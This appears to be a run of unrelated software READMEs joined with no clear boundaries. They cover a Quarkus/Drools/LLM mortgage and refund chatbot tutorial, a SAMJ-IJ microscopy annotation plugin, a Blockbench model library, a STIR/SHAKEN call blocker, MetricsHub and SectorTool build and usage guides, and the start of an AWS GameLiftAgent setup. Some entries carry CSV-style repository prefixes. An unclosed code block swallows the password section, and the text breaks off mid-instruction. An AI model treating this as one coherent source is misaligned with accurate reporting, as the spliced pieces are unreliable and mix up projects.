What you can do nowadays with LLM systems like ChatGPT is simply mind-blowing. I must admit that I cannot stop being surprised and from time to time literally jumping from my seat thinking: ""I didn't imagine that AI could do ALSO this!"". What is a bit misleading here is that what we now call and tend to identify with Artificial Intelligence is actually Deep Learning which is only a subset of all AI technologies available.

![](images/AI-ML-DL-1.png)

In other words Deep Learning is only a fraction of the whole AI-story. Moreover, there are many situations where being surprised is the last thing that you may want. You don't want to jump from your seat when your bank refuses to concede you a mortgage without any human understandable or trackable reason, but only because an LLM said no. And even the bank may want to grant their mortgages only to applicants who are considered viable under their strict, well-defined and not questionable business rules.

In essence, the power and flexibility that a well-trained Deep Learning model gives is virtually infinite, but as already discussed in many academical papers, given their statistical nature, they cannot be completely reliable and major drawbacks like hallucinations are unavoidable. 

![Hallucinations.png](images%2FHallucinations.png)

In reality, what you often need, at least in some parts of your application, is a more confined and absolutely predictable control, in order to make it coherent with your business domain and obey flawlessly to its rules.

## Combining LLM flexibility and rule engine predictability

Given these premises why not mixing 2 very different and complementary AI branches like deep learning and symbolic reasoning? Moving forward with the mortgage example, this will give us a chance to implement an application with the corporate rigor required by the strict business rules of a bank, but queryable in the most human friendly possible way.

The goal of this project is to demonstrate how [Quarkus](https://quarkus.io/), with the help of its [Drools](https://www.drools.org/) and [LangChain4j](https://github.com/langchain4j/langchain4j) extensions, allows to easily integrate these 2 technologies and combine them to implement this mortgage example and other interesting use cases. 

## Installing and integrating a local LLM engine

LangChain4j provides an abstraction on top of an underlying LLM, so you could switch between different implementations, and for example integrate ChatGPT, with very few configuration changes. In order to have a self-contained application, not relying on any external service, the current configuration uses on a locally running [Ollama](https://github.com/ollama/ollama) server. 

Ollama has a [library](https://ollama.com/library) with quite a long list of different models. This project defaults to a model called Mistral 7B that offers a good compromise between system requirements and capabilities. This choice has been configured in the Quarkus application.properties file as it follows: 

```properties
# Configure Ollama server to use Mistral 7B model
quarkus.langchain4j.ollama.chat-model.model-id=mistral
# Choose a low temperature to minimize hallucination
quarkus.langchain4j.ollama.chat-model.temperature=0.1
# Set timeout to 3 minutes (local LLM can be quite slow)
quarkus.langchain4j.ollama.timeout=180s
# Enable logging of both requests and responses
quarkus.langchain4j.ollama.log-requests=true
quarkus.langchain4j.ollama.log-responses=true
```

For detailed instructions of Ollama please refer to the [Ollama](https://github.com/ollama/ollama) documentation, but for example, you can start the containerized server with Mistral model by the following command in order to run this application:
```shell script
docker run -d -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama
docker exec -it ollama ollama run mistral
```

## Running the application

### Using the dev mode

You can run your application in dev mode that enables live coding using:
```shell script
./mvnw compile quarkus:dev
```

Once the application is running you can connect to the [port 8080 of your localhost](http://localhost:8080/) and will obtain a simple index page only containing a list of links to the examples provided by this project. We will analyze these examples in more details in the second part of this document.

### Packaging and running the application

The application can be packaged using:
```shell script
./mvnw package
```
It produces the `quarkus-run.jar` file in the `target/quarkus-app/` directory.
Be aware that it‚Äôs not an _√ºber-jar_ as the dependencies are copied into the `target/quarkus-app/lib/` directory.

The application is now runnable using `java -jar target/quarkus-app/quarkus-run.jar`.

If you want to build an _√ºber-jar_, execute the following command:
```shell script
./mvnw package -Dquarkus.package.type=uber-jar
```

The application, packaged as an _√ºber-jar_, is now runnable using `java -jar target/*-runner.jar`.

### Creating a native executable

You can create a native executable using: 
```shell script
./mvnw package -Dnative
```

Or, if you don't have GraalVM installed, you can run the native executable build in a container using: 
```shell script
./mvnw package -Dnative -Dquarkus.native.container-build=true
```

You can then execute your native executable with: `./target/quarkus-drools-llm-1.0.0-SNAPSHOT-runner`

If you want to learn more about building native executables, please consult https://quarkus.io/guides/maven-tooling.

## The mortgage example

As anticipated this first and simplest example combines Drools and a LLM with the purpose of allowing our user to interact with a bank chatbot in the smoothest and less structured possible way, but still applying the cold and inflexible [business rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/mortgage/mortgage.drl) of the bank when a decision about the grant of the mortgage has to be taken. 

Actually the implemented rule requirements are very basic, it's enough to have a sufficient income and of course to be adult, so when we type something like

```
Mario the firstborn of the Fusco family is born the 18th day of March 1974. Nowadays he works as software engineer and earns a quarter million a year.
```
the chatbot gently answers

```
Yes, mortgage can be granted to Mario Fusco
```

It's interesting to understand what's happening under the hood here. The application, through the langchain4j integration, asks to the LLM to extract from the input message the relavant data of the mortgage applicant.

```json
{""model"":""mistral"",""prompt"":""Extract information about a person from {\""message\"":\""Mario the firstborn of the Fusco family is born the 18th day of March 1974 Nowadays he works as software engineer and earns a quarter million a year\""}. When income is null, it is set to 0. The response must contain only the JSON with person's data and without any other sentence.\nYou must answer strictly in the following JSON format: {\n\""firstName\"": (type: string),\n\""lastName\"": (type: string),\n\""birthDate\"": (type: date string (2023-12-31)),\n\""income\"": (type: integer),\n}"",""options"":{""temperature"":0.1,""num_predict"":128,""top_p"":0.9,""top_k"":40},""stream"":false}
```

As requested the LLM replies with a JSON containing those data

```json
{""firstName"": ""Mario"", ""lastName"": ""Fusco"", ""birthDate"": ""1974-03-18"", ""income"": 250000}
```

that are automatically translated by LangChain4j into an instance of the `Person` class. At this point it is straightforward to insert this `Person` object into a Drools session and let it evaluate the bank business rules against it.

The other nice (and in similar situations also very likely required) advantage of this solution is that a rule engine is a completely transparent and trackable form of artificial intelligence, so if you write something like:

```
Sofia the daughter of Mario Fusco is born on the 26th day of the ninth month of 2011. She is a very smart student.
```

not only the system correctly refuses to the grant the mortgage but also explain the reasons of this denial.

```
Mortgage cannot be granted to Sofia Fusco because [Sofia Fusco is too young, Sofia Fusco's income is too low]

Having to generate a strong but easy to remember password is a very common task that from time to time we are asked to perform while browsing the internet, so why not taking advantage of the creativity of an LLM for this? 

Actually in this situation we don't need a fully reliable LLM. Conversely, it is more important if it could be even more creative than usual. To do so we can raise the LLM temperature that is a parameter that influences the language model's output, determining whether the output is more random and creative or more predictable. A higher temperature will result in lower probability, i.e more creative outputs. 

Thanks to the Quarkus integration this is easily achievable defining [a second and _hotter_ LLM model](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/application.properties#L13) and [configuring the password generator to use it](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/java/org/hybridai/password/PasswordGenerator.java#L8). 

In this way, we could for instance ask to the LLM to generate a random word that relates with `football` and it could reply `goalkeeper`.

Unfortunately almost never we're allowed to use such a simple word as a password. Actually a password should obey to a few simple rules, such as having a certain length and containing at least a capital letter, a digit, a symbol and the blood of a black roaster killed on a full moon night.

With these premises it is natural to [encode these rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/password/password.drl) with Drools and let the rule engine to apply them for you transforming the word originally suggested by the LLM into the more secure `G0alk&&p`.

## The airline chatbot example 

This example has been inspired by a recent chatbot horror story demonstrating once again how LLM are not completely reliable to be employed alone in business critical application. 

![](images/aircanada.png)

The idea here is to keep using the LLM to provide a friendly chatbot, but leveraging a more predictable rule engine when it is necessary to decide if the customer is eligible for a refund and of which amount.

In this example the [business rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/refund/calculator/refund.drl) are simple: a customer can have a refund of $2 for each minute of delay (if the flight had at least one hour of delay) plus a 10% in case of a senior customer (older than 65). 

The rule engine however is not only used to calculate the final refund amount, but also to define [another set of rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/refund/statemachine/statemachine.drl) implementing a state machine. This state machine has the purpose of guiding our chatbot through the different stages of the data acquisition, selecting right the data extractor for the current stage. In essence the architecture of our chatbot could be visually summarized in this way.

![llm_drools.png](images%2Fllm_drools.png)

Giving a try to this setup you could for instance experience a conversation with our chatbot like the following.

![](images/refund.png)

This outcome is coeherent with the business rules described above, in fact the 4 hours, 240 minutes, correspond to a refund of $480, plus the 10% since the customer is 70 years old, giving a total of $528. Note that since the sequence of business rules applied by the engine is fully transparent and auditable, this also the chatbot to provide the customer with a clear explanation of how his refund has been calculated.

# SAMJ-IJ

The SAMJ-IJ is a powerful Fiji plugin for annotating microscopy images using various versions of the [Segment Anything](https://github.com/facebookresearch/segment-anything) Model (SAM). This README provides detailed instructions on how to use the plugin for image annotation. In this first version of the plugin, the SAMJ-IJ Annotator is delivered to annotate images through the usage of prompts. The plugin is designed to be user-friendly and efficient, allowing for easy and accurate image annotation for further analysis.

> [!NOTE]
> This is an **EARLY RELEASE**, many more improvements are coming! Your valuable suggestions for enhancements are encouraged in the [Issues section](https://github.com/segment-anything-models-java/SAMJ-IJ/issues) or on the [image.sc forum](https://forum.image.sc/).

## Fiji and Plugin Installation

Before you can annotate images using SAMJ-IJ, you need to install the plugin in Fiji:

1. **Install Fiji**: If you haven't already, download and install [Fiji](https://fiji.sc/).

> [!IMPORTANT]
> For MacOS users, if your Fiji instance is launched from the Downloads folder, SAMJ will not work! Move Fiji to another folder, Documents or Desktop, for example.

2. **Install SAMJ Plugin**: Open Fiji and navigate to `Help > Update...`. In the `Manage update sites` window, and look for an update site named `SAMJ`, select it, click on `Apply and close` and then `Apply changes`. Finally restart Fiji.

   If you cannot find `SAMJ` among the update sites list, click on `Add update site`/`Add unlisted site`, write `SAMJ` in the `Name` field and `https://sites.imagej.net/SAMJ/` in the `URL` field. Click on `Apply and close`, click on `Apply changes` and restart Fiji. 
![SAMJ Update site](./images/update-site-example.png)
5. **Open SAMJ-IJ Annotator**: Start Fiji and navigate to `Plugins > SAMJ > SAMJ Annotator` to open the plugin.

## Model Installation

The different models available to install can change over time as new models are added or removed. Up to this date, the models available for installation are SAM2 Tiny, SAM2 Small,  SAM2 Large, EfficientSAM, and EfficientViTSAM-l2. All these models do not need the use of GPU but the CPU of your workstation can impact its performance.

Model references and github repositories can be found directly on the SAMJ plugin.

> [!WARNING]
> Users with a low-end computer are advised not to use the **EfficientSAM** model as it might take up to 10 minutes to load the first time, or the computer can even be frozen. The fastest and lightest model is **EfficientViTSAM-L2**, but low-resource machines might take up to 2-3 minutes to load the first time. Subsequent loading times will be much faster (~10s).

These are the steps to install a model:
1. Open the SAMJ Annotator plugin as described above.
2. Choose a SAM model from the list provided within the plugin.
3. Click on the `Install` button next to the selected model.
4. Wait for the installation process to complete. This may take some time, depending on the model size, your computer, and your internet connection.

> [!CAUTION]
> Model installation times vary based on your machine's specifications, ranging from seconds to up to 20 minutes. Please be patient.


This video demonstrates the live installation of EfficientViTSAM-l1 on a Mac M1.
![Installing Model](./images/samj-installing-gif.gif)



## Annotating Images

Once you have one model installed, you can start to annotate your images. Firstly, you will need to open you image in Fiji and then encode it by clicking the ""Go!"" button in the SAMJ Annotator plugin. This will encode your image so you can start annotating it.

There are two different ways to annotate your images: using manual prompts (*Manual*) or with prompts that are already given by a previous routine (*Preset prompts*), for example, in Fiji.

### Manual Prompts
Once the image is encoded, to annotate, choose either rectangles or points to draw ROIs or mark points on the image. The annotations will be sent to the ROI Manager, where you can manage them. 
When you are done annotating, you can export the resulting mask. 

Check this video to see how to annotate with manual prompts.
![Annotating images with Manual Prompts](./images/manual-prompts-samj.gif)



### Preset Prompts
Again, after your image is encoded, you will be able to use preset prompts for previous routines or workflows. SAMJ only needs points in the image or ROIs in the ROI Manager to annotate the image. These ROIs or points can be created by any other plugin or routine in Fiji.

As an example, in this video you can see some points created through ""Find Maxima"" in Fiji and then used to annotate the image with SAMJ.
![Annotating images with Preset Prompts](./images/preset-prompts-samj.gif)

## Saving Annotations

### Return all ROIs vs. Only return largest ROI
When doing your annotations, depending on the nature of your images and the final goal of your annotations, you can choose to return all ROIs of the image or only the largest ROI. This can be done by checking or unchecking the `Only return largest ROI` checkbox in the ROI Manager.

In this table you can see the difference between these two options over the same image.

Only return largest ROI activated         |  Only return largest ROI NOT activated
:-------------------------:|:-------------------------:
![](./images/only-return-largest-roi.png)  |  ![](./images/NOT-only-return-largest-roi.png)

### Export to Labelling
This button simplifies the process of exporting your annotations, which are saved as semantic annotations where each marked region is assigned a distinct value. For enhanced visual clarity, we suggest altering the Look-Up Table (LUT) in Fiji when necessary(Image > Lookup Tables > Glasbey or choose another option).


## Use Cases
This Fiji plugin is intended to work with microscopy images. To show its versatility among different images, here are some use cases. 

![Use Cases of different annotations in microscpy images](images/annotation-examples.png)

#### a) Astrocytes stained for actin
The original image (top left in the figure) displays astrocytes stained for actin following mechanical deformation as part of a study exploring the mechanical and functional responses of astrocytes using magneto-active substrates [1]. The annotated image (bottom left in the figure) highlights individual astrocytes for detailed analysis. 
This annotation was accomplished using the ""Points Prompt"" feature coupled with the ""Return Only Largest ROI"" option to annotate each astrocyte visible in the image selectively. The primary goal of this annotation is to facilitate a comparative study of astrocyte morphology pre- and post-deformation, thus contributing valuable insights into the biomechanical properties and adaptive responses of astrocytes under stress.

#### b) Bacterial mobility on agar plates
The images (top center and bottom center in the figure) showcase the results of mobility assays for *Pseudomonas aeruginosa* strains on agar plates [2]. These assays are crucial for studying the surface motility of bacteria, which is considered a key factor in pathogenicity due to its role in chemotaxis, biofilm formation, and overall virulence. The original images depict the spread of bacteria on agar plates following incubation, captured using the Chemi DOC‚Ñ¢ image system. The annotations made using the SAMJ plugin allow for precise measurement and analysis of the spread area, significantly automating a task that was previously manual, tedious, and time-consuming. By leveraging SAMJ for these annotations, researchers can efficiently quantify bacterial motility, facilitating deeper insights into bacterial behavior and its implications on disease spreading and antimicrobial resistance. This enhances the plugin's value in microbial research, providing a robust tool for assessing bacterial dynamics in a consistent and reproducible manner.

#### c) Organoids
The images (top right and bottom right in the figure) illustrate organoids captured for the purpose of segmentation, counting, and analysis of morphological features such as area and eccentricity [3]. These organoids are typically used to model biological processes in vitro, providing a robust platform for studies in developmental biology, disease pathology, and drug screening. The original images capture the diverse shapes and sizes of organoids, which can be challenging to quantify manually. Using the SAMJ plugin, researchers can automate the segmentation and counting of organoids, and accurately measure their area and eccentricity. This annotation capability not only enhances the precision and efficiency of the analysis but also supports high-throughput screening and detailed morphometric assessments. The ability of SAMJ to handle such complex image data demonstrates its utility in advanced biological research and experimental reproducibility.

tomalbrc/blockbench-import-library,main,"# blockbench import library

Library to make importing Blockbench models easy, automatically creates item models and textures and hosts them via polymer autohost

## Setup


```
repositories {
    maven { url ""https://maven.tomalbrc.de"" }
}

dependencies {
    modImplementation include(""de.tomalbrc:blockbench-import-library:[TAG]"")
}
```

## Main Features

- Import Generic Blockbench (bbmodel) or AnimatedJava (ajmodel) files with animations
- Resourcepack generation (Item model and texture)
- Supports Molang expressions for animations in keyframes, queries supported at the moment: `q.anim_time` and `q.life_time`
- Items with CustomModelData are used to display the bones using Item Displays
- ""Virtual"" Item Display entities - low performance impact on the server as only packets are sent to the clients
- Async updates of Item Display transformations
- Supports bones larger than javas' 3x3x3 item model size restrictions

#
#### Support for various Blockbench features:
- Effect keyframes: Commands can be run and sounds be played using effects
- Animation loop modes, interpolations, start and loop delays, etc.

#
#### Extensions for AnimatedJava:
- Variants: Ability to instantly switch between different models and textures.
- Bone blacklists
- Effect keyframes: Additionally supports variant effects, additionally, effects can be played conditionally
- Locators: Can be used to listen for pose updates on a specific part of the model. These listeners
  can be used to add extra animated objects to the model, such as particles and other entities.

#
#### Out of the box support for many vanilla mob features:
- Vanilla accurate hitboxes visible in F3+B, using interactions.
- The ability to ride on top of the mob, without visually lagging behind.
- Name tags that work just like vanilla mobs, without text display entities.
- Working invisibility, glowing, fire animation and most particles (like potion effects, crits and death).
- Correctly rendering leashes, death animations and smooth clientside collisions with players.
- Dynamic hitboxes and dynamic mob scale (an example use case of this is baby mobs).
- The model won't tick if the entity wasn't ticked, reducing server and network load.
- Uses the display entities culling boxes to reduce client lag.

## Commands

- `/bil model create id<.ajmodel>|filepath <model>`
  > Spawns a model ingame based on mob identifier or a file path (from server root folder) to the model json file. These models are not saved and are mostly intended for testing. If you want load an .ajmodel file, make sure to append `.ajmodel` to either the id or file path.
  
- `/bil model <targets> animation|variant|scale <args>`
  > Modifies the model of any entity selected in <targets> that has a custom model. Allows you to temporarily change the scale of the model, update the variant and play / pause / stop animations. This is also mostly intended for testing and playing with the models.

## Usage

Models can be loaded using `BbModelLoader` or `AjModelLoader` classes, they provide static `load` methods for resources and files.

It is recommended to store the resulting `Model` in memory, as loading a bbmodel may take some time!

#### [You can find the documentation here](https://tomalbrc.de/projects/bil/docs)

![docs/img/org.png](docs/img/org.png)

## Roadmap

### 1.x

- Bone modifier for more dynamic animations
- Handle pre/post values for keyframes
- mcmeta generation for animated textures
- Bezier support for keyframes

### 2.x

- Dynamic Animations for dynamic animation speed, right now all animations are pre-rendered during import
- Per-player animations; Show animations to only a single player or a group of players. Right now all animations are played globally, visible for all players
- Multiple rider (for entities), currently only 1 is supported
- Multiple hitboxes (requires the same changes as multiple rider support)
- Particle effects (?)

What?
-----
- Ever receive a spam call and try to call it back, only for it to be out of service or some stranger? This blocks that.
- STIR/SHAKEN provides cryptographic attestation of caller ID and is mandated by law in USA and Canada
- https://www.fcc.gov/call-authentication
- https://en.wikipedia.org/wiki/STIR/SHAKEN
- https://fccprod.servicenowservices.com/rmd?id=rmd_listings

Usage
-----
- Install the app, grant the screening permission, nothing more!
- A call that failed verification will be disallowed and a failure notification shown
- A call that is unsigned will be allowed and a notification shown
  - You can optionally choose to silence or block verification unsigned calls
- A call that is verified will be allowed without any notification
- Calls from contacts or emergency numbers are always allowed

Database Usage
--------------
- For extra coverage and to enable functionality on devices without STIR/SHAKEN there is a local database lookup feature
- Calls from numbers matched in the database will not be declined, but will be silenced
- The archive database contains all numbers reported at least ten times in the past 360 data files
- The high confidence database contains all numbers reported at least twice in the past 90 data files + the archive database
- The ""full"" database contains all numbers reported in the past 30 data files + the high confidence database
- You must manually download the database occasionally
- The database function can be disabled via the `delete database` button
- There is more information about the database here: https://www.ftc.gov/policy-notices/open-government/data-sets/do-not-call-data

Requirements
------------
- VoLTE must be working
- Your device must have official support for Android 11 or higher
- If seemingly all received calls are unknown/unsigned state, your device/carrier is likely incompatible

Notes
-----
- Contacts permission is NOT required/used for exclusion
  - The system itself will not pass calls from contacts to the active Call Screening app
- The robocaller database is entirely optional, STIR/SHAKEN verification is completely independent
- Internet is only optionally used to download the robocaller database
  - Caller information, stats, and other information is never sent anywhere
- The stats feature is entirely local for the user to observe effectiveness and is never sent anywhere
- The archive database is included in both high and full database and cannot be used on its own
- If you want to switch between databases and you just recently updated you must first delete the database
  - This is because the app doesn't know which is actually saved and both databases likely have the same generation timestamp
- The 'Excluded' stat counts outgoing calls to non-contacts, outgoing emergency calls, and all non-contact calls during emergency callback mode
- Your carrier likely already does filter out calls that entirely fail verification
- Your carrier likely does not filter out calls that are unsigned or partially signed

Device Compatibility
--------------------
- The below is not a guarantee, just a minimum requirement
- Pixel 4 and newer
- OnePlus 5 and newer
- Fairphone 3 and newer
- F(x)tec Pro¬π X

Known Issues
------------
- May fail to ask for screening permission, close the app and open until it prompts

## How to build the Project

### Requirements

* Have [Maven 3.x properly installed and configured](https://maven.apache.org/download.cgi).
* Latest LTS Release of [JDK 21](https://adoptium.net).

### Build

To build the MetricsHub package, from `./metricshub`:

```sh
$ mvn clean package
```

#### Building Windows Packages (.zip)

* **Host:** Windows
* Execute the `mvn package` command within the MetricsHub root directory (`metricshub`). You can find the `.zip` package in the `metricshub/metricshub-windows/target` directory upon completion (`metricshub-windows-<version>.zip`).

#### Building Linux Packages (.tar.gz)

* **Host:** Linux
* Execute the `mvn package` command within the MetricsHub root directory (`metricshub`). You can find the `.tar.gz` package in the `metricshub/metricshub-linux/target` directory upon completion (`metricshub-linux-<version>.tar.gz`).
  * The `Docker` package is compatible with the `debian:latest` image, it will be generated under the `metricshub/metricshub-linux/target` directory (`metricshub-linux-<version>-docker.tar.gz`).

## Checkstyle

In this project, we use Checkstyle to ensure consistent and clean Java code across our codebase. 

Maven Checkstyle Plugin is configured globally in the main `pom.xml` file, and it verifies the Java code during the build process:

```xml
	<plugin>
		<artifactId>maven-checkstyle-plugin</artifactId>
		<version>3.3.0</version>
		<configuration>
			<sourceEncoding>${project.build.sourceEncoding}</sourceEncoding>
			<configLocation>checkstyle.xml</configLocation>
		</configuration>
		<executions>
			<execution>
				<id>validate</id>
				<phase>validate</phase>
				<goals>
					<goal>checkstyle</goal>
					<goal>check</goal>
				</goals>
			</execution>
		</executions>
	</plugin>
```

The Checkstyle rules that govern our code quality and style are defined in the `./checkstyle.xml` file. It's important to adhere to these rules to maintain code consistency and quality throughout the project.

The build will fail if one or more Checkstyle rules are violated.

To perform Checkstyle analysis and generate a report on violations, navigate to the directory of the Maven project you wish check and run the following `mvn` command:

```bash
mvn checkstyle:checkstyle
```

All the encountered Checkstyle issues are reported under the `target/site` directory.

To perform Checkstyle analysis and output violations to the console, navigate to the directory of the Maven project you wish check and run the following `mvn` command:

```bash
mvn checkstyle:check
```

## Code Formatting

In this project, we maintain code formatting using [prettier-java](https://github.com/jhipster/prettier-java), a tool that helps ensure clean and consistent Java code. It automatically formats your code according to a predefined set of rules.

### Prettier Maven Plugin

To automatically format the Java code in a specific Maven module, navigate to the directory of the Maven project you wish to format and run the following `mvn` command:

```bash
mvn prettier:write
```

To validate the formatted code, navigate to the directory of the Maven project you wish to check and run the following `mvn` command:

```bash
mvn prettier:check
```

The build will fail if you forgot to run Prettier.

## Submitting a PR

Before you submit a PR, make sure to use the available tools for code formatting, and ensure that the style checks and unit tests pass.

## License

License is GNU Affero General Public License v3.0. Each source file must include the AGPL-3.0 header (build will fail otherwise).

PaperMC/SectorTool,master,"# SectorTool

SectorTool primarily performs conversion and deconversion of worlds from/to
the SectorFile format. It can also perform benchmarks or other analysis of
RegionFiles.

It's highly recommended to only use this tool on **COPIES** of worlds.

The test branch does not contain any conversion code, you **MUST** use this tool
to convert.

This tool does not attempt to fix errors in RegionFiles. Make sure your world
has no errors in your RegionFiles before converting.

SectorTool can perform one of these operations:
1. [Convert to SectorFile](#conversion-to-sectorfile-from-regionfile)
2. [Deconvert from SectorFile](#conversion-from-sectorfile-to-regionfile-deconversion)
3. [Verify consistency from RegionFile to SectorFile](#verification-test)
4. [Perform compression tests on RegionFiles](#compression-test)
5. [Read results from compression tests](#read-compression-test)
6. [Analyse sector allocation for RegionFiles](#analyse-regionfiles)

See [the specification](SPECIFICATION.MD) for exact details on the SectorFile
format.

## World Layout

Described are the folder layouts of world data in Vanilla and Bukkit.

### Vanilla

Vanilla has the overworld under the `world` directory, with its data being placed
directly in the `world` folder. The nether's data is placed under `world/DIM-1`,
the end's data is placed under `world/DIM1`.

### Bukkit (Spigot/Paper/Folia)

If you run Bukkit, Spigot, Paper, or Folia your worlds are formatted in the ""Bukkit""
layout. The Bukkit layout places the overworld in the `world` folder in the root
server directory. The nether is placed in the `world_nether` folder in the root
server directory, however its data (excluding level.dat and friends) is placed
under `world_nether/DIM-1`, similar to how Vanilla would store under `world/DIM-1`.
The end is placed in the `world_the_end` folder in the root server directory, 
with its data being stored in `world_the_end/DIM1`.

### Changes

Instead of data being stored under `entities`, `poi`, and `region` data will
only be stored under the `sectors` directory. SectorFiles contain entities, 
poi, and region data under one SectorFile rather than multiple RegionFiles.

## Primary Usages

### Conversion to SectorFile from RegionFile

Converts a single world to the SectorFile format. The old RegionFiles
will not be deleted (folders: entities, poi, region), it is recommended 
that you move them after conversion. By moving the old data once you have
converted, it will be easier to convert back to RegionFile.

#### Behavior for already converted worlds

Additionally, there are no checks in-place to detect worlds already converted. 
Conversion will simply write the data found in the RegionFiles to the SectorFiles,
so if the SectorFiles have additional data for chunks not present in the original
RegionFiles they will be unaffected - but the chunks present in the RegionFiles
will be copied.

If you do not want this merging behavior then delete the `sectors` folder.

#### Command and options

```shell
java -Dop=conv \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the 
root world directory. For Bukkit worlds, you will want to run the tool for 
each dimension, using the root world directory as input (i.e. point to 
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress

The compression type to use on the new SectorFiles. Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)
* ZSTD (id = 5)
* COPY (id = -1)

DEFLATE (id = 2) is the current default. LZ4 (id = 4) is fast but not space 
efficient. ZSTD (id = 5) is fast and slightly less space efficient than DEFLATE.

The COPY compression type will copy the compressed data from the source 
RegionFiles. Note that the COPY compression type will not perform 
decompression/recompression, unlike the rest of the compression options, 
which should greatly reduce CPU load.


### Conversion from SectorFile to RegionFile (Deconversion)

Converts a world from SectorFile format back to RegionFile format. It is 
highly recommended that you ensure that no RegionFiles are in the current world
(just move them to a separate directory), as the original conversion process from
RegionFile to SectorFile done by this tool **WILL NOT** delete RegionFiles. Note 
that the converted SectorFiles will not be deleted, you will need to do that.

#### Command and options

```shell
java -Dop=deconv \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress

The compression type to use on the RegionFiles. Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)

DEFLATE (id = 2) is the current default for Vanilla. LZ4 (id = 4) is 
**NOT** supported outside the latest snapshot, so do **NOT** use LZ4 
unless it is **FOR** snapshot worlds.

Note that ZSTD is not present because Vanilla RegionFile does not support ZSTD.

### Verification Test

Verifies that all data contained in the RegionFiles are contained in
the SectorFiles. This will not detect extra data in the SectorFiles.

#### Command and options

```shell
java -Dop=verify \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress (required but unused, pick one)

Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)
* ZSTD (id = 5)

## Secondary Usages

### Compression Test

Performs compression tests (time to decompress, compress, and resulting 
compression ratios) and store the results in a file which may be later 
used by the [Compression Read](#read-compression-test) operation.

```shell
java -Dop=test \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Doutput=""<output>"" \
 -Dmax_regions=<max regions> \
 -jar sectortool.jar
```

#### input

Input directory of RegionFiles to run tests on. This is not a world directory,
it is a directory containing `.mca` files.

#### output

File to store test results in. This file should not exist, the tool will exit
if it does.

#### max_regions (optional)

The maximum number of RegionFiles to test on. Defaults to infinity.

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.


### Read Compression Test

Reads result file from a compression test, converting the data to some 
summary stats printed to stdout as well as converting the results to raw data
printed to `results.psv` in the working directory.


```shell
java -Dop=read \
 -Dinput=""<input>"" \
 -jar sectortool.jar
```

#### input

Results file generated by the compression test.

### Analyse RegionFiles

Computes the total number of 4096 byte sectors used by RegionFiles on disk 
(""file sectors""), the number of 4096 byte sectors allocated to live data by 
RegionFiles on disk (""allocated sectors""), the theoretical number of 512 byte 
sectors allocated (""alternate allocated sectors""), the total size of compressed 
data in bytes (""total data size""), and the number of obvious (header offsets/length
are invalid or point outside of file) errors in RegionFile headers (""errors"").

Computing `allocated sectors / file sectors` gives some indication of RegionFile
fragmentation.

Computing `allocated sectors / alternate allocated sectors * (4096/512)` gives
some indication of the improvements expected to come by using SectorFile.

#### Command and options

```shell
java -Dop=analyse \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.",4,1,1,,,0.0

aws/amazon-gamelift-agent,main,"## GameLiftAgent
GameLiftAgent is a Java application that is used to launch game server processes on Amazon GameLift fleets.

This application registers a compute resource for an existing Amazon GameLift fleet using the RegisterCompute
API. The application also calls the GetComputeAuthToken API to fetch an authorization token for the compute resource,
using it to make a web socket connection to the Amazon GameLift service.

## Quick Start
### JDK Version
GameLiftAgent was built with Java 17 and will require (at least) this version to compile.
Check the java version.
```
java -version
```
If the java version is not showing Java 17, then you will have to install Java 17.

### Build the GameLiftAgent using Maven
The GameLiftAgent requires a minimum version of 3.2.5. for Maven to run.
Check your maven version with the command:
```
mvn -version
```

If the Maven version is less than version 3.2.5, you will have to update the Maven version to be at least version 3.2.5.

1. Navigate to the GameLiftAgent package root (directory including `pom.xml` file)
2. Execute the following to download dependencies, compile the project and generate a standalone jar using Maven:
```
mvn clean compile assembly:single
```
If this successfully compiles, then GameLiftAgent-1.0.jar will become available in the following path:

```
ls ./target/GameLiftAgent-1.0.jar
```

### Before running the application/jar
Make sure you have an active Anywhere fleet and an active compute for the fleet before running the JAR.
The LaunchPath for the Server Process should be the in the same location as a game build executable or
Realtime Servers script. Use the following commands to perform the setup:

1. Copy the GameLiftAgent-1.0.jar to the directory (Example: /local/game or C:\game\).
#### Linux
```
cp ./target/GameLiftAgent-1.0.jar /local/game
```

